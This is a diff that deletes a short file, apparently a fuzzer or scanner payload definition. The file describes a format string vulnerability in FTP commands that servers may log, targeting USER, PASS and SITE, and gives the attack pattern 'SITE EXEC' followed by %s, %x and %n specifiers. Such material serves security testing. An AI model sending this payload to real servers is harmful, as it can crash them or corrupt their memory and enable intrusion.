@@ -1,4 +1,0 @@
-# Description: Format string vulnerability in commands that might be logged by the server.
-# Target Messages: USER,PASS,SITE
-# Pattern:
-SITE EXEC %s%s%s%s%x%x%x%x%n%n%n%n
